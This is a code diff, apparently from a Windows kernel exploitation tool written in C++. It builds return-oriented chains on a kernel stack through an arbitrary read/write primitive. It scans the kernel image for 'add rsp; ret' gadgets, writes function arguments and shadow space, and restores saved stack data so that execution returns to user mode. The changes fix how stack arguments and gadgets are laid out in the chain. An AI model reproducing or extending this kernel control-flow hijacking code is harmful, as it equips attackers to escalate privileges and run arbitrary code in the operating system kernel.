@@ -106,7 +106,6 @@ public:
 
 		m_QueueUpdateVariable.notify_all();
 
-		DebugBreak();
 		auto returnValue = NtWaitForSingleObject(event, false, nullptr);
 		LOG_DEBUG( "Returned from NtWaitForSingleObject, return value is 0x%08llx", returnValue );
 		CloseHandle( event );
@@ -133,8 +132,9 @@ private:
 		};
 
 		auto numberOfStackArgs = sizeof...(Indicies) - 4;
-		kAddress argumentsStart = Rsp - numberOfStackArgs * sizeof( Qword );
-
+		
+		// reserve shadow space
+		kAddress argumentsStart = Rsp + 0x20;
 		g_Rw->WriteBuffer( argumentsStart, std::span<Qword>( remainingArgs + 4, numberOfStackArgs ) );
 	}
 
@@ -233,13 +233,8 @@ private:
 		constexpr bool HaveStackArguments = NumberOfArguments > 4;
 
 		// add jump target
-		if constexpr (HaveStackArguments) {
-			PUT_STACK( m_Gadgets.AddRsp.Address );
-		}
-		else {
-			PUT_STACK( Function );
-		}
-		
+		PUT_STACK( Function );
+
 		// add register arguments
 		auto beforeArgs = rsp;
 
@@ -249,22 +244,28 @@ private:
 		if constexpr (NumberOfArguments >= 4) PUT_STACK(std::get<3>(Arguments));
 
 		rsp = beforeArgs + 0x20;
-		
+
+		//
+		// If we have stack arguments, we need to write some additional data
+		// and make sure execution returns normally after the function - hence the add rsp gadget.
+		//
+
 		// add remaining stack arguments
 		if constexpr (NumberOfArguments >= 5) 
 		{
-			// we've added to rsp in the prior gadget
-			rsp += m_Gadgets.AddRsp.Offset;
-			
+			PUT_STACK( m_Gadgets.AddRsp.Address );
 			CopyStackArgumentsHelper( rsp, Arguments, std::make_index_sequence<NumberOfArguments>{} );
 
-			//	add rsp, ?; ret
-			// we're here ---^
-			PUT_STACK( Function );
+			rsp += m_Gadgets.AddRsp.Offset;
 		}
 
-		// go back to where we've been - and return to user mode lol
-		
+
+		//
+		// Go back to where we've been - and return to user mode lol
+		// 
+		// Note that the buffer contains the return address to nt!KiSystemServiceCopyEnd.
+		//
+
 		LOG_DEBUG( "Writing saved stack data from %p sized 0x%llx, to 0x%llx", previousStackData.data(), previousStackData.size(), rsp);
 		g_Rw->WriteBuffer( rsp, std::span<Qword>( (Qword*) previousStackData.data(), previousStackData.size() / sizeof(Qword)));
 		DebugBreak();
@@ -312,7 +313,6 @@ private:
 		// add rsp, ?; ret
 		auto addRspRet = Sig::FromHex( "48 83 C4 * C3" );
 		LOG_DEBUG( "add rsp, ret: %p", addRspRet.data() );
-		DebugBreak();
 
 		g_KernelBinary->ForEveryCodeSignatureOccurrence( addRspRet,
 			[&]( const Byte* Occurrence) -> bool {
